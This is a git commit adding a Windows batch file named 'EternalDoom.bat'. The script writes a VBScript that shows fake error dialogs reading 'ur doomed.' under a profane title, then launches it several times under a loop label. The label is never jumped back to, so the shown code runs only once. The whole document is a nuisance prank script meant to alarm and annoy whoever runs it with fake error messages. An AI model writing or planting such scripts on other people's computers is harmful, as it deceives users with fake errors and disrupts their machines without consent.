fa4b5ac1aa8ed2040cedde7f945b3ceaaf24913c
VistamationsOSC <JaxtonGageSanders@gmail.com>
2024-07-14 13:19:57 -0400

    Add files via upload

---
+++ EternalDoom.bat
@@ -0,0 +1,10 @@
+
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+echo.X=MsgBox("ur doomed.",0+16,"fucked.") >> FakeErrorMsg.vbs
+:loop
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg.vbs
